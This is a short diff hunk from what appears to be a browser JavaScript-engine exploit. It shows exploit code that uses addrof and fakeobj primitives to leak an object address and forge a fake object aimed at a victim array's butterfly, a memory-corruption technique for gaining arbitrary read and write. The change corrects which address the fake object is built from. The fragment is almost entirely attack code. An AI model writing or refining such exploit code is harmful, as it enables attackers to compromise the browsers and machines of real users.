@@ -495,7 +495,7 @@ for (var i = 0; i < 1000; ++i) {
 
     print("outer @ " + hex1(addrof(container)));
 
-    var hax = fakeobj(addrof(outer) + 0x10);
+    var hax = fakeobj(addrof(container) + 0x10);
     // "Point" refers to changing the given array's butterfly
     // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
     //
